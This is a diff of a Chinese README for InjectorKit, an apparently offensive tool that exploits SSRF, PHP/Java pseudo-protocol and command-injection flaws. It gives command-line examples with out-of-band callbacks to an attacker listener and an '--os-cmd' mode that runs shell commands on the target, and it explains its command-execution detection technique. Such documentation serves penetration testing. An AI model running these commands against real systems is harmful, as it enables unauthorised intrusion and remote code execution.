@@ -6,7 +6,7 @@
 
 它是流量驱动扫描器的进攻侧对应物：扫描器回答"这个参数有没有漏洞"，InjectorKit 回答"怎么进去、进去之后做什么"。它探测、读证据、决定下一步、在过滤器拦住时换手法，直到拿到利用点，或者证明这条路走不通。
 
-首批覆盖 SSRF 与 PHP 伪协议（`php://`、`gopher://`、`dict://`、`data://`、`phar://`）。后续漏洞类型（含反序列化）都建立在同一套引擎上。
+覆盖的类别是 SSRF、PHP 与 Java 伪协议（`php://`、`gopher://`、`dict://`、`data://`、`phar://`、`jar:`、`jrt:`）以及命令注入。后续漏洞类型（含反序列化）都建立在同一套引擎上。
 
 ## 从这三条开始
 
@@ -14,6 +14,11 @@
 
     python injectorkit.py ssrf -u "http://target/api/fetch?url=http://example.com"
     python injectorkit.py proto -u "http://target/?file=index.php"
+    python injectorkit.py cmdi -u "http://target/ping?host=127.0.0.1"
+
+带 body 的请求默认就是表单 POST，所以表单后面的参数用 `--data` 而不是查询串：
+
+    python injectorkit.py proto -u "http://target/" --data "file=index.php" --param file
 
 页面是表单提交而不是查询串时，让它自己读表单：
 
@@ -67,8 +72,22 @@ Python 3.11 或更新。核心零第三方依赖，检出即可运行。经 inte
     python injectorkit.py ssrf -u "http://target/api/fetch?url=x" --param url --oob 10.0.0.5:8081
     python injectorkit.py ssrf -u "http://target/api/fetch?url=x" --oob-interactsh oast.pro
     python injectorkit.py proto -r burp.txt --param file --oob 10.0.0.5:8081
+    python injectorkit.py cmdi -u "http://target/ping?host=127.0.0.1"
 
 `-r` 收一份原始 HTTP 报文（Burp 里复制出来的那种），报文里的每个参数位置都会成为可注入点。
+
+目前三个类别：`ssrf` 问 URL 参数能到达哪里；`proto` 问路径参数接受什么、又会交回什么；`cmdi` 问参数够得着哪个 shell、在那里能跑什么。
+
+### 命令注入
+
+问题是算术：工具让目标打印两个新生成的标记，中间夹一个算出来的数字。回显输入的页面会把**表达式**还回来，只有真的跑过的 shell 才会还回**那个数字**。payload 本身不含答案，所以页面回显自证不了。
+
+因为这个问题不依赖具体 shell，shell 就成了**要搜索的量**而不是前提。`sh`、`bash`、PowerShell 和 Windows 命令解释器被建模成"能打印字面量、也能打印和"的语言，再和"命令怎么起头"叉乘——值本身就是整条命令，或者它是页面已经在跑的某条命令的参数、得先把它结束掉。在这里"没被拦住"不算答对，所以搜索会一直往上爬，直到真的有东西跑起来。
+
+跑通之后，`--os-cmd` 会沿着证成的那个形态执行一条命令；如果链在"证成"和"使用"之间失效了，它如实说没跑，而不是把页面当输出：
+
+    python injectorkit.py cmdi -u "http://target/ping?host=127.0.0.1" \
+        --exploit --os-cmd 'id; uname -a'
 
 ### 拿 shell
 
